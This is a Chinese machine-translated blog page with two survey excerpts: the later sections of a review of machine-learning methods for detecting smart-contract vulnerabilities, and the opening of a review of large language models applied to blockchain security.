集成方法集成ML结合多个模型来提高预测精度、鲁棒性和泛化性，这些都是SC漏洞检测的关键。通过汇总来自不同分类器的输出，集成方法减少了方差和偏差，通常优于单个模型。补充材料表S14中总结了几种基于集成的方法，这些方法已显示出显著的性能增益。\nSCVDIE-Ensemble集成了多种神经网络来提高准确性和鲁棒性。基于堆叠的集成与元学习器[105]将欺诈检测召回率提高到97.18%。PonziTect应用有序增强来解决类别不平衡问题，达到97%的召回率，而AI-SPSD通过整合公共数据来扩展庞氏检测，从而提高鲁棒性。\nMuLCas采用带有阈值投票的多视图级联集成来组合来自多个分类器的预测，包括开发人员级别的特征。虽然这种方法改进了欺诈检测，但它强调了进一步优化召回的必要性。多模态决策融合方法集成了源代码、操作码和CFG特征，提高了性能，但其有效性因漏洞类型而异。软投票集成合并了在不同特征表示上训练的多个dnn的输出，减少了错误传播并提高了分类精度。\n\n关键的见解\n\n集成模型通过组合不同的分类器和特征类型来提高鲁棒性，从而更有效地检测漏洞。\n召回率和模型稳定性的可变性强调了控制集成体系结构和优化特征表示的必要性。\n\n\n4.5 混合方法混合ML模型结合了互补的学习技术来提高SC漏洞检测的准确性、鲁棒性和可扩展性。如补充材料表S15所述，最近的研究表明，这些模型在适应性和效率上都超过了独立的方法。\nSCVD-SA将cnn与自关注相结合，优先考虑关键特征，增强了对多个漏洞的检测。同样，CNN-LSTM-Attention模型同时捕获了空间和时间模式，在重入性方面的f1得分为90.20%，召回率为90.47%。CGE将gnn与专家定义的控制和数据低模式相结合，在可重入性、时间戳依赖性和无限循环方面分别获得86.41%、87.75%和82.13%的f1得分。\nReVulDL使用GraphCodeBERT融合gnn和transformer进行重入检测，而SmartDT将基于注意力的深度学习与符号执行集成在一起，以增强可解释性和远程依赖建模。Liu等人利用增强了专家规则的gnn来分析基于图的SC特征。GRU- rf将GRU与rf相结合，平衡检测精度和效率，准确率达到98.47%。然而，注意层和循环层增加了计算复杂性，强调了在大规模部署中进一步优化的必要性。\n\n关键的见解\n\n混合模型提高了检测精度，但需要进一步优化以实现可扩展性和高效部署。\n混合体系结构有限的可解释性突出了对XAI和特征归因技术的需求，以确保透明性。\n\n\n4.6 元学习方法元学习使模型能够用最少的标记数据在任务之间进行泛化，使其非常适合SC漏洞检测，其中注释的示例很少，并且经常出现新的威胁。He等人和Yang等人开发了基于模型不可知元学习（MAML）算法的框架，使用cnn在N-way K-shot设置中以EVM字节码作为输入。He等人在低数据场景下表现出优于传统模型的性能，而Yang等人报告了强有力的结果，总结在补充材料的表S16中。\n一个关键的区别在于输入表示。SC学习者-元学习者框架（SCLMF）[158]将字节码转换为RGB图像，帧检测作为图像分类任务。它在Omniglot上达到了98.5%的准确率，但在sc特定的w潦草数据集上只有72.36%，这揭示了在捕获契约语义方面的局限性。相比之下，FSL-Detect从操作码构建cfg，提取TF-IDF特征，并将MAML与CNN集成。在2-way 5-shot设置下，它达到了93.98%的f1得分，提高了30%的召回率，突出了将结构和语义特征结合起来对于sc特定上下文的价值。\n\n关键的见解\n\n元学习提高了对有限数据的适应性，但其计算开销突出了对更高效和可扩展策略的需求。\n结果表明，表示选择强烈影响现实世界的性能，领域知情建模优于基于图像的方法\n\n\n4.7 迁移学习由于数据不平衡、领域特定的特征和有限的标记实例，用于SC漏洞检测的传统ML模型通常难以推广到未见过或未充分代表的漏洞类型。迁移学习解决了这些挑战，利用知识从特征明确的漏洞，以提高对罕见或新颖类别的检测。正如补充材料表S17所总结的那样，目前的研究强调了它超越静态、单一任务模型的有效性。\nYe等人提出了一种领域自适应框架，该框架结合了用于合成数据生成的变分自编码器（VAE）和用于隔离共享和特定于领域的特征的领域分离网络（DSN）。他们的模型在检测由重入性转移的时间戳依赖漏洞方面达到了93.2%的准确率，比纯源基线高出25%。Naeem和Alali采用轻量级分类器利用句法和语义相似性进行交叉漏洞预测，报告的四个数据集的f1得分在73%到93%之间，大多数超过80%。\nQian等人引入了一种跨模态方法，其中只有字节码的学生模型使用源代码和字节码从教师模型中学习。Le等人通过定制的蒸馏器模型（与MLP和LSTM层进行线性调优）应用迁移学习，使用深度上下文化代码表示来检测可重入漏洞。\n\n关键的见解\n\n迁移学习通过域不变特征和跨类型语法相似性增强了对未见或未充分代表的SC漏洞的泛化。\n当共享特征表示可用时，DSN等轻量级模型可以有效地检测漏洞，而无需重新训练。\n\n\n4.8 比较分析传统的机器学习模型，特别是集成模型，对于SC漏洞检测仍然非常有效，一些研究报告的准确率和召回率超过95%。RF在非法账户检测方面达到98%的召回率和97.5%的准确率，而LGBM在类似任务中这两个指标的准确率为99%。即使是简单的KNN模型也能达到98%的召回率。基于集成的方法通常对单个漏洞检测最有效，但由于特征表示的限制，在多漏洞场景下性能下降。\n在单漏洞和多漏洞检测方面，先进的集成方法继续优于许多现代方法，一些研究报告了95ś98%的精度和96ś97.26%的召回率。混合架构也表现强劲，超越了传统的ML和gnn（例如，GRU RF实现了97.34ś98.3%召回率）。最近的研究越来越多地利用LLM，如GPT-4和基于codeberta的框架，其中9调优模型的召回率达到97.37%。然而，由于每类报告和异构数据集，多漏洞任务的性能比较仍然具有挑战性。\n对比学习、元学习和迁移学习等新兴学习范式通过增强适应性和泛化能力显示出强大的潜力。对比学习取得了竞争性的结果（例如，95.36%的召回率），而元学习（基于mml的）在少量射击设置下表现优异，召回率高达91.56%[64]。迁移学习进一步提高了跨数据集泛化，召回率达到91.09%。尽管探索较少，但这些方法是对现有ML框架的补充。\n不同模型类型的训练和检测时间差异很大。在回顾的传统模型中，只有RF和KNN报告较低的训练时间，只需要0.01ś0.06 s，而更复杂的模型，如EGA，需要47ś53 s来检测。cnn报道0.13ś0.15的检测次数为s。基于gnn的方法通常涉及更高的检测开销，例如，SCVHunter报告的平均检测时间为0.66 s，而ContractGNN达到2.19 s。同样，基于llm的技术表现出更高的检测时间，PonziSleuth需要5.52秒，基于gpt -3的VulnHunter需要23秒。\n考虑到它们较低的训练开销，RF（一种集成方法）和KNN（一种简单的基于实例的模型）都适合快速部署。然而，它们的实时适用性取决于推理延迟和系统约束等因素，而这些因素在所回顾的研究中没有得到检验。相比之下，gnn和llm显示更高的计算成本，使它们更适合在线分析。性能特征的总结在补充材料中提供（表S4śS17），并在第5节中进行进一步讨论。\n5 讨论以及未来的研究方向现有的基于ml的SC漏洞检测方法存在一些特点和局限性。图3概述了影响解决方案设计的关键因素，以及相关的需求。本节讨论每个因素，评估针对这些要求的当前方法，并强调未来的研究方向。\n\n5.1 检测阶段方法SC漏洞通常通过三种主要方法检测：部署前、部署后和零日检测。预部署方法，如在部署前分析SC源代码，以识别漏洞并确保安全发布。部署后的方法，例如，监视事务行为以检测异常。\n一些方法，例如，将静态代码特征与事务数据结合起来以提高准确性，尽管这些方法需要部署sc和足够的事务历史记录。零日检测方法，例如，旨在在部署后立即识别恶意sc，在任何交易之前，使其有效应对庞氏骗局和地毯拉等威胁。\n尽管部署前检测是必要的，但某些漏洞仅在执行过程中出现，而有些合约是带有恶意目的设计的。因此，全面的安全解决方案应该集成所有三个检测阶段：在部署前验证sc，在执行期间监视它们，以及在部署后立即检测零日威胁\n\n潜在的研究方向\n\n检查集成的基于ml的方法，以快速检测和预防SC漏洞。\n探索不同区块链环境中SC检测工具的有效集成点。\n优化基于ml的检测技术，在资源限制下实现可扩展、实时和链上执行。\n\n\n5.2 分类问题SCs通常包含多个漏洞，使得检测本质上是一个多标签分类问题。然而，一些基于ml的模型专注于单一的漏洞类型，限制了现实世界的适用性。\n在文献中，SC漏洞检测被视为具有多标签类的二值分类或作为一个多类问题。Momeni等人经验表明SC漏洞是独立的，证明需要为每个漏洞训练单独的二元分类器，这一方法与网络威胁检测实践一致。确定具体的脆弱性类型对于指导有针对性的缓解战略仍然至关重要。\nS-ML方法由于其结构化分类能力和对标记数据集的高准确性而获得了比U-ML方法更多的关注。然而，这种对标记数据的依赖限制了对零日漏洞和不断发展的SC结构的适应性。此外，随着新威胁的出现，为每个漏洞训练单独的模型会带来可扩展性方面的挑战\n相比之下，U-ML方法，如聚类和异常检测，显示出检测未知漏洞的潜力。然而，他们对统计偏差的依赖，而不是执行意识分析，往往导致高假阳性。此外，对操作码变化和编译器不一致的敏感性降低了它们在不同SC实现中的通用性\n\n潜在的研究方向\n\n根据网络威胁检测需求，开发能够检测各种SC漏洞的基于ml的方法。\n检查U-ML技术在零日SC漏洞检测方面的潜力，重点是执行感知模型，以减少误报并提高准确性。\n设计S-ML和U-ML相结合的混合模型，增强适应性和精度。利用图学习、变换和对比学习可以改进特征表示，用于新的威胁检测。\n\n\n5.3 数据集的特点数据集的质量、多样性和结构严重影响基于ml的SC漏洞检测的性能、鲁棒性和泛化性。如补充资料总结表S18所示，现有数据集可分为四种类型：(1)原始构建的，为特定任务从零开始构建，相关性高但资源密集；(2)合并，通过组合多个源来提高多样性，通常需要预处理来解决不一致性；(3)扩展，通过在现有数据集上添加特征或样本来提高准确性；(4)用于基准测试的其他数据集的复制、精确副本，但通常已经过时或缺乏多样性。\n在回顾的研究中，Etherscan explorer是最常用的数据源，其次是BigQuery、CryptoscamDB和dapp相关平台。所收集数据的可靠性取决于这些来源的准确性、多样性和及时性。一些被检查的数据集已经过时，缺乏反映SC漏洞和区块链技术快速发展所需的定期更新。\n此外，数据集在标签多样性、样本量和类别分布方面差异很大。许多模型样本不足或类失衡严重，限制了模型的泛化和训练的有效性。例如，970,898份合同中有34,200份是脆弱的（约占4%），突出了不平衡的严重性。\n然而，在反映现实世界条件的最佳类别比例上没有达成共识，导致不同研究的方法不一致。\n类别不平衡带来了重大挑战。机器学习模型往往偏向于大多数类别，导致对脆弱的SCs的召回率很低。像LR和SVM这样的传统算法很难从罕见的情况中学习，因为它们的损失函数由多数类数据主导。因此，在不平衡的数据集上训练的模型不能泛化，往往在错过关键漏洞的情况下获得误导性的高准确性。\n为了解决这个问题，我们研究了三个主要策略，如图4所示。数据驱动技术包括过采样、欠采样和混合采样。过采样提高了少数族裔的代表性，但可能会引入噪音和覆盖。欠采样减少了多数类样本以减少偏差，但有丢弃有价值信息的风险。混合采样平衡两者，但需要仔细调优以避免数据丢失或冗余\n\n算法驱动的方法修改了学习过程本身。其中包括类权重调整和集成学习，以减轻偏差并提高鲁棒性。虽然这些方法保留了原始数据，但它们需要仔细地进行超参数调优，如果配置不当，可能会出现覆盖或遗漏的问题。混合方法结合了这两种策略，以利用它们的优势，同时减轻个体的缺陷。然而，在选择最佳重采样比和调谐参数方面仍然存在挑战\n尽管区块链数据的可访问性，为SC漏洞检测策划的公共数据集仍然有限。许多条目过时，缺乏多样性，标签不完整，或者需要大量预处理的原始格式。这种稀缺性源于专有限制、隐私风险、高数据准备成本以及精确SC注释的技术复杂性等因素。这些挑战凸显了协作开发和维护高质量开放获取数据集的必要性\n\n潜在研究方向\n\n系统分析SC漏洞，攻击模式和关键属性，以构建高质量的数据集。从业者的输入对于控制定义和确保与现实世界的威胁保持一致至关重要。\n为SC数据集的构建、维护和扩展开发自动化的自适应框架，以确保及时更新、语义完整性和有效的模型训练。\n通过抗噪声重采样、混合采样和成本敏感学习增强不平衡处理，同时避免覆盖和保持数据多样性\n通过改进表征、重采样和损失函数来推进多标签学习，以捕获脆弱性之间的关系并解决类别不平衡问题\n\n\n5.4 功能类型如图5所示，ML模型使用了几种特征类型来检测SC漏洞和相关攻击。这些特性可以分为基于代码的、基于事务的或混合的。\n\n基于代码的特性是研究最广泛的。基于令牌的特性（补充材料的图S8）提供了丰富的语法和语义信息，但需要源代码，而源代码通常是不可用的。代码重用也会导致跨sc的字节码重复，增加数据集冗余。\n基于操作码的特征（补充材料的图S9）是从字节码中提取出来的，更适合于现实世界的场景，尽管它们的可解释性较差。混合功能(图S10的补充材料)集成表示（例如，令牌操作码）以捕获更丰富的语义，但增加了复杂性。附加的特征类型（补充材料的图S11）捕获了可选的SC行为\n基于事务的特性（补充材料的图S12）可以是静态的，也可以是动态的。静态特征捕获交易特征（例如，gas使用），而动态特征反映行为方面（例如，交易量），并可能包括基于图形的特征，将帐户交互建模为链接。需要进一步的研究来评估图特征和交叉类型组合的效用。\n基于代码的特性可以在部署前或部署后提取，从而实现早期检测，而基于事务的特性需要实时SC活动。合并代码和事务数据的混合方法通常可以提高性能，如补充材料的图S13所示。\n不同的特性类型可以检测到相同的漏洞。例如，结合账户和图形特征来检测庞氏骗局，而仅依赖于图形特征。Rizzo等人的基准测试证实了输入类型（如源、操作码、AST、CFG）显著影响检测性能。没有哪一种功能类型总是优于其他类型。多模态输入，特别是在集成模型中，通常会产生更好的结果。由于实验设置的异质性，确定一个普遍最优的特征类型仍然是不可行的。\n\n潜在的研究方向\n\n由于实验设置的异质性，现有研究对不同特征类型的有效性提供了不确定的证据。需要进行全面的实证评估，以确定检测各种SC漏洞和相关攻击的最佳特征。\n\n\n5.5 特征工程机器学习模型需要预处理数据来进行有效的训练。特征工程是选择、提取和转换相关数据属性的过程，在提高模型精度方面起着至关重要的作用。技术的选择取决于问题的性质。\n如图6所示，许多研究依赖于基于nlp的方法从原始SC数据中提取特征。一些人采用手工方法，而另一些人，如Chen等人，则提出自定义提取技术。Pragasam等人利用BigQuery平台进行自动特征采集。\n尽管消除不相关的特征可以显著提高模型性能，但图7显示，特征选择通常没有得到充分的研究。有限的选择技术的采用意味着SC漏洞检测的最佳方法仍然没有解决。\n在回顾的研究中确定了四种数据标记策略（参见图8）：(1)利用以前的提示，(2)使用SC分析工具，(3)从公共存储库检索标记的合同，以及(4)手动注释。考虑到SC漏洞不断演变的本质和攻击者使用的混淆策略，标记方法必须捕捉每个漏洞的最新模式\n\n潜在的研究方向\n\n研究各种特征提取和选择方法对SC漏洞检测中ML模型性能的影响，重点是确定基于投票的选择策略等最佳技术。\n通过鼓励专家主导对部署的SC和漏洞报告的分析，解决标记SC漏洞数据集的短缺问题。建立一个共享的、最新的公共存储库对于支持有效的基于ml的SC漏洞检测至关重要。\n\n\n5.6 绩效评估准确性、精密度、召回率、f1分数等评价指标被广泛应用于SC漏洞检测研究中。然而，这些指标经常在不平衡的数据集上产生误导性的结果。准确性忽略了类的分布。f1分数忽略了真正的否定，并且相对于类别标签是不对称的。马修斯相关系数（MCC）通过结合混淆矩阵的所有四个元素来解决这些问题，为平衡和不平衡数据集提供公正的评估。MCC只有在正确预测正面和负面类别时才会获得高分，而不管它们的比例如何。\n\n\n\n一些研究，使用SC漏洞分析工具作为评估ML模型的基线。然而，这些工具无法检测所有类型的SC漏洞，限制了它们进行全面性能比较的有效性。\n除了分类度量之外，评估训练时间、推理延迟和模型复杂性对于评估部署可行性也是必不可少的。在在线环境中，训练时间决定了模型适应新威胁的速度。在实时场景中，低推理延迟对于部署前检查和持续监控至关重要。模型复杂性不仅影响计算开销，还影响可解释性和部署的便利性，特别是在受约束或分散的环境中。尽管这些指标很重要，但它们经常被忽视，这限制了在现实条件下评估模型有效性的能力。\n\n潜在的研究方向\n\n为基于ml的SC漏洞检测采用稳健的验证策略，结合不同的度量、统计显著性测试和可视化分析工具（如箱线图）\n评估训练时间，推理延迟和模型复杂性，以确保在线分析和实时部署的适用性。\n\n\n5.7 概括性模型验证对于确保可靠和可复制的性能结果至关重要。大多数研究采用保留方法（将数据分为训练和测试），由于样本差异，可能产生不一致的结果，从而限制了通用性。虽然Zheng等人认为交叉验证不适合具有时间依赖性的数据，仍然需要健壮的验证策略。一些研究只在训练集中进行交叉验证。考虑到大多数SC数据集的规模较小，保持训练和测试数据之间的平衡分布是至关重要的。\n标记SC漏洞数据集的稀缺性仍然是一个主要挑战。这些数据集通常很小，不平衡，并且特定于领域，限制了对看不见的漏洞，契约结构，编译器版本和不断发展的语法的推广。迁移学习提供了一个很有前途的解决方案，它使模型能够跨契约类型进行泛化，尽管仍需要进一步研究在线调整和领域适应策略。\n\n潜在的研究方向\n\n通过跨越多个区块链平台的多种真实数据集，提高基于ml的漏洞检测的泛化和适应性。强调交叉验证、特征对齐和对抗性训练，以管理领域转移、不断发展的SC标准和编译器变化。\n通过迁移、在线和自监督学习提高学习效率和鲁棒性。利用相关的漏洞类别并启用增量更新来解决未见的或混淆的威胁，而无需频繁的再培训。\n使用集成表示训练的多模态和基于llm的模型提高检测精度。采用数据融合和对比调优来更好地捕获微妙的漏洞模式。\n\n\n5.8 检测能力迄今为止，没有一种基于ml的方法可以检测到所有SC漏洞；大多数方法都针对特定类型。例如，SoliAudit专注于算术和重入问题，而SCScan使用部分基于ml的架构针对DoS漏洞。这突出了传统机器学习技术的局限性，它依赖于手工制作的特征，并与看不见的攻击向量作斗争。\n\n最近的进展结合了结构和语义分析来提高覆盖率。gnn通过对代码依赖关系进行建模来增强结构推理，而转换器和llm则捕获上下文和语言级语义。元学习和对比学习促进了低数据场景下的泛化，从而能够检测新出现的漏洞。然而，在可解释性、可伸缩性和部署方面仍然存在挑战。\n图9和图10所示的对所回顾研究的比较分析表明，DT、SVM和KNN经常被应用，但套袋（RF）和提升（XGB）集成通常可以获得更好的性能，特别是在检测非法账户和庞氏骗局方面。LGBM虽然不太常见，但表现良好，这表明模型选择通常更多是由熟悉程度而不是经验证据驱动的。由于其较高的复杂度和计算成本，堆栈和投票集成很少被采用。DL模型、LSTM、Bi-LSTM和GCN由于数据集小、SC语义复杂和缺乏特定领域的架构设计而未得到充分利用。\n对于零日漏洞，gnn检测cfg、DFGs和相关图中的结构异常，但依赖于准确的图提取，语义推理有限，使得它们对微妙的攻击不太有效。llm泛化了看不见的模式，但在没有特定于领域的调优的情况下，很难处理原始字节码和运行时数据。集成方法结合多个机器学习模型来提高泛化和鲁棒性，但在面对新行为时往往会增加计算量和误报。\n迁移学习能够从预先训练的模型中进行适应，但会受到领域转移的影响。对比学习有助于异常检测，但需要精心配对，并且可解释性较差。元学习支持以最少的数据快速适应新威胁，尽管其有效性取决于预训练的多样性。结合gnn、llm和元学习为全面的零日检测提供了一个有前途的方向。\n\n\n潜在的研究方向\n\n开发基于ml的模型，能够检测各种SC漏洞，包括零日漏洞，并通过定期更新和评估来确保在不断发展的分散环境中的有效性。\n通过探索增强、套袋和自适应堆叠来推进集成方法，同时研究基础学习器的上下文感知选择和评估数据集之间的模型一致性\n通过多模态学习（例如，源代码、字节码、跟踪、审计报告）和对抗性训练增强基于llm的检测，以提高对混淆和逃避的鲁棒性。\n通过模型压缩和架构优化来解决效率挑战，从而改进混合模型。\n探索元学习以实现快速泛化，并提高可解释性，以支持实际部署。\n\n\n5.9 模型老化恶意软件的性质不断演变其防止检测的方法。因此，必须定期评估基于机器学习的漏洞检测系统；它们必须能够检测到任何新的漏洞模式。在基于ml的检测模型中应该解决的主要问题之一是模型老化&#x2F;漂移[172]。鉴于恶意软件的快速发展，大多数被分析的方法可能会随着时间的推移而急剧退化。目前基于ml的SC漏洞检测方法尚未研究漂移检测。\n\n潜在的研究方向\n\n不断发展的SC漏洞需要主动的模型漂移管理来保持检测的可靠性。研究应该探索漂移检测算法，评估漂移的严重程度、时间和受影响的特征区。\n在基于llm的检测中解决模型老化问题需要持续的学习策略来保持先前的性能。PEFT方法和自适应快速调优可以降低再培训成本，提高对新出现威胁的响应能力。\n\n\n5.10 机器学习模型的能力和效率ML模型检测SC漏洞的能力取决于它们处理和表示代码特征的方式。单个模型（例如，LR， SVM）是高效的，并且非常适合于检测简单的，基于模式的漏洞，如算术溢出和时间戳依赖，这通常涉及显式的操作码模式或数值阈值。\n集成方法（例如RF， XGB）结合多个学习器来提高性能，使它们对中等复杂的漏洞（如访问控制违规和未检查的低级调用）有效，这些漏洞涉及更微妙的特征交互。gnn对于捕获sc中的结构关系特别有效，有助于检测依赖于调用序列和内部契约行为的可重入性和授权逻辑律。\n基于转换器的模型擅长通过对SC代码的语义和句法结构建模来识别高级逻辑漏洞。混合方法，如将gnn与集成模型相结合，提供了更广泛的覆盖范围，但随之而来的是计算复杂性的增加和可解释性的降低。\n除了检测精度外，计算效率对于实时或链上使用至关重要。如补充材料表20所示，传统模型需要最少的训练和推理资源，因此适合在受限环境中部署。集成方法虽然资源更密集，但提供了折衷方案：套袋模型支持并行推理，而增强方法以顺序训练和较慢推理为代价获得更高的准确性。gnn和变压器擅长结构和语义推理，但需要大量的计算资源，限制了它们在在线或审计阶段分析中的使用。由于多层推理管道，混合模型进一步增加了开销。\n6 总结SC安全仍然是一个重大挑战，许多灾难性的攻击造成了重大的经济损失。新的SC漏洞的不断出现强调了对能够识别零日攻击的强大检测方法的需求。mlmodel在检测SC漏洞和相关攻击方面显示出越来越大的希望。在本文中，我们进行了一项最新的调查，突出了ml模型用于SC漏洞检测的潜力。我们提供了一个对已知漏洞进行定义和分类的综合参考，并根据漏洞的来源介绍了一种新的分类法：安全问题、编程语言问题和开发问题。我们对每个漏洞的传统和先进的基于ml的检测方法进行了回顾和分类，并对实证研究的关键方面进行了比较和总结。我们还概述了在开发基于ml的检测方法时需要考虑的重要因素，并确定了有希望的未来研究方向。本文可以作为对推进ml驱动的SC漏洞检测感兴趣的研究人员和实践者的详细参考\n","tags":["智能合约论文"]},{"title":"区块链安全大语言模型：系统文件综述","url":"/2025/11/10/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E7%BB%BC%E8%BF%B0/","content":"区块链安全大语言模型-系统文件综述摘要大型语言模型（llm）已经成为网络安全各个领域的强大工具。值得注意的是，最近的研究越来越多地探索LLM在区块链安全（BS）背景下的应用。然而，对于llm在区块链安全性方面的全部应用范围、影响和潜在约束的全面理解仍然存在差距。为了填补这一空白，我们进行了一项文献综述，重点是将llm应用于区块链安全（LLM4BS）的研究。\n我们的研究旨在全面分析和理解现有的研究，并阐明llm如何有助于提高区块链系统的安全性。通过对现有文献的彻底检查，我们深入研究了llm与区块链安全的各个方面的集成。我们探索了llm可以增强区块链安全性的机制，包括它们在智能合约审计、交易异常检测、漏洞修复、智能合约程序分析以及作为加密货币社区参与者方面的应用。此外，考虑到可扩展性、隐私问题和道德问题等因素，我们评估了与利用llm增强区块链安全性相关的挑战和限制。我们的全面审查揭示了LLM4BS任务的机会和潜在风险，为研究人员，从业者和政策制定者提供了有价值的见解。\n1.介绍随着数字时代的推进，人工智能与区块链技术的融合成为一项突破性的发展，特别是在大型语言模型（Large Language Models, llm）与不断发展的区块链安全领域相交的关键时刻。llm已经上升到区块链安全的前沿，在文本生成和理解，特别是在源代码分析方面展示了深刻的能力，这些能力反映了模仿人类的熟练程度。这种变革性的影响归功于它们庞大的数据集、复杂的架构和支撑其运营框架的深度神经网络。\nllm在识别和综合数据中的复杂模式方面的健壮性使它们成为增强区块链系统内安全措施的宝贵资产。具体来说，智能合约的细粒度分析，交易的细致审查，以及自动代码（resp.）。文本)生成是llm擅长的关键任务之一，并且效果显著。\n然而，将这些认知功能集成到区块链安全性中会遇到一系列需要考虑的挑战。应对不断发展的网络安全威胁的复杂动态，解决人工智能部署带来的道德问题，使这条轨迹既充满希望，又充满要求。尽管取得了进展，但仍然缺乏全面描述LLM在区块链安全中的应用现状和未来发展前景的工作。\n为了填补这一空白，我们试图深入研究llm在区块链安全领域的多方面作用，探索llm在区块链安全（LLM4BS）任务上的综合范围。我们首先描述跨不同领域（§2.1）的大型语言模型（LLM）应用程序的当代景观，以及区块链技术所涉及的无数安全威胁（§2.2）。然后，如表1所示，我们详细说明了LLM4BS任务的合并和进展，涉及智能合约审计、块交易检测、合约动态分析、智能合约开发和加密货币社区贡献者（§3）。此后，我们精心选择了LLM4BS任务的三个典型案例来阐明最先进的LLM4BS任务（§4），包括LLM4FUZZ ， SMARTINV , BLOCKGPT。最后，我们对LLM4BS范围内目前面临的挑战进行了深刻的论述，并为这一新兴领域的未来研究和发展提供了前瞻性的轨迹（§5）。\n\n本文的贡献如下：\n\n据我们所知，在对现有文献进行了细致的回顾之后，我们进行了第一次系统的检查，重点是将大型语言模型应用于区块链安全领域内的任务，为先进的人工智能和分布式账本系统之间的相互作用提供了开创性的探索。\n在我们的全面调查中，我们细致地记录了区块链安全领域中大型语言模型应用的现状。我们深入研究了如何在各种场景中使用大型语言模型的详细分析，从增强智能合约的可靠性到加强分布式账本系统的完整性。这揭示了这项尖端技术的多方面贡献。\n在研究的基础上，我们严格整理和总结了一系列与Large应用相关的实践学术成果加强区块链安全性的语言模型（llm）。我们还为未来的研究提出了几个有希望的途径，预计这些将在这个新兴的交叉领域催化实质性的进步和创新。\n\n2.LLM4BS概述我们在本节中提供有关LLM4BS任务的基本知识，包括§2.1中的LLM应用程序和§2.2中的区块链安全威胁。\n2.1 大语言模型的介绍本小节将解释大型语言模型（llm）的定义、特征和各种应用。\n2.1.1 LLM的定义和特点大型语言模型（llm）代表了人工智能领域的突破性进步，特别是在自然语言处理（NLP）领域。这些模型的特点是它们巨大的尺寸、深度和复杂性，使它们能够以惊人的流畅性和连贯性处理和生成类似人类的文本。llm的核心是转换器架构，这是一个强大的序列建模框架，它彻底改变了NLP领域\nLLM的定义特征包括其前所未有的规模，它涉及对包含数十亿甚至数万亿个单词的庞大文本数据语料库进行训练。这些广泛的训练数据使llm能够捕捉语言的复杂细微差别，包括语法，语义和语用，从而赋予他们对语言结构和惯例的深刻理解。此外，LLM表现出高度的生成能力，能够在广泛的任务和领域中生成上下文相关和连贯的文本。\n此外，LLM具有显著程度的适应性，这要归功于他们通过迁移学习等技术对特定应用或领域进行微调或专门化的能力。通过利用预训练模型并在特定任务数据集上对其进行微调，从业者可以定制llm来解决各种各样的NLP任务，从情感分析和语言翻译到文档摘要和会话代理。\n\n此外，LLM展示了对语言上下文的高级理解，使他们能够生成对周围文本上下文敏感的响应或预测。这种上下文感知是通过注意机制和位置编码等机制实现的，这些机制使llm能够关注输入序列的相关部分，并有效地为长期依赖关系建模。总的来说，LLM代表了人工智能研究的一个重要里程碑，并为人机交互、内容生成、信息检索等方面开启了新的可能性。它们大规模理解和生成自然语言的能力导致了各个领域的变革性应用，塑造了人工智能驱动技术的未来\n2.1.2 LLM在各个领域的应用如图1所示，LLM的多功能性和有效性使其在不同领域和应用中被广泛采用，在这些领域和应用中，LLM表现出了卓越的性能和实用性。LLM的一些值得注意的应用包括：\n自然语言理解（NLU）：LLM擅长于情感分析、命名实体识别和文本分类等任务，在这些任务中，对语义和上下文的理解至关重要通过利用他们对语言的深刻理解，LLM可以准确地分析和解释文本数据，从而实现社交媒体监控中的情感分析或客户反馈分类等任务。\n自然语言生成（NLG）：LLM精通为各种应用程序生成类似人类的文本，包括内容创建、对话系统和虚拟助手，他们能够产生连贯的和与上下文相关的反应，这使他们在任务中非常宝贵例如生成产品描述、组合个性化消息，或者在会话界面中促进自然语言交互。\n信息检索和摘要：LLM在从大量文本中提取相关信息并生成简明摘要，从而促进高效的信息检索和知识提取方面发挥着至关重要的作用。无论是总结新闻文章，从研究论文中提取关键见解，还是为文档生成摘要，LLM都提供了一个强大的解决方案，可以将大量文本数据提炼成易于消化和信息丰富的摘要\n语言翻译：LLM通过在多种语言之间提供更准确和流畅的翻译，彻底改变了机器翻译。通过利用他们丰富的语言知识和对上下文的理解，LLM可以在翻译中保留原文的意思、语气和风格，从而在包括电子商务、国际外交和多元文化交流在内的各个领域实现跨语言障碍的无缝沟通。\n对话系统： llm为会话代理和聊天机器人提供了强大的功能，使其能够与用户进行自然且符合上下文的交互。无论是协助客户进行产品查询，提供个性化建议，还是提供客户支持，基于LLM的对话系统都提供了一种用户友好且高效的沟通方式，增强了用户体验和参与度。\n代码生成：LLM越来越多地被用于生成代码片段，并通过理解和生成各种编程语言的代码来帮助开发人员完成编程任务，通过分析代码存储库和文档，llm可以生成遵循编程约定、语法规则和最佳实践的代码，从而加快开发过程，并帮助代码维护和调试\n科学研究： LLM通过分析和总结研究论文、提出假设和协助数据解释来支持科学发现。通过摄取大量的科学文献和特定领域的知识，LLM可以帮助研究人员导航不断扩大的科学文献，识别相关出版物，并提取有价值的见解，以告知他们的研究工作\n这些应用强调了LLM在广泛领域和行业中的广泛实用性和变革潜力，突出了它们在推进人工智能能力和实现人机交互方面的重要性以前所未有的复杂程度进行交互。随着LLM的不断发展和完善，他们对各个领域的影响预计将在未来几年增长，推动创新，效率和发现。\n2.2 区块链安全基础本节将讨论区块链系统的关键组件和常见安全威胁。\n2.2.1 区块链安全的关键组件区块链安全是一项多方面的工作，旨在保护在区块链网络中存储和处理的数据的完整性、机密性和可用性。区块链安全的关键组件包括：\n密码学：密码学是区块链安全性的核心，用于加密数据、验证参与者并确保事务的完整性。使用散列、数字签名和加密密钥等技术来保护数据并验证区块链上事务的真实性\n共识机制： 共识机制是管理如何验证事务并将其添加到区块链的协议。通过在网络参与者之间达成一致，共识机制确保了分布式账本的不变性和完整性。流行的共识机制包括工作量证明（PoW）权益证明（PoS）和委托权益证明（DPoS）每个人都有自己的长处和弱点。\n去中心化：去中心化是区块链安全的核心原则，在节点网络上分配控制和决策权。通过消除单点故障并降低审查或操纵的风险，去中心化增强了区块链网络的弹性和安全性。然而，实现真正的去中心化需要仔细考虑节点分布、治理结构和网络激励等因素\n智能合约安全：智能合约是自动执行的合约，具有在区块链上编码的预定义规则和条件。确保智能合约的安全性对于防止漏洞、利用和未经授权的访问至关重要。正式验证、代码审计和安全开发实践等技术被用来减轻与智能合约相关的风险，包括重入攻击、整数溢出&#x2F;下溢和未检查的外部调用\n\n2.2.2 区块链系统常见安全威胁尽管区块链技术具有固有的健壮的安全措施，但各种安全威胁和漏洞对区块链系统的完整性和功能构成了风险。我们在图2中说明了这些威胁。区块链系统中常见的安全威胁包括：\n基于共识的攻击： 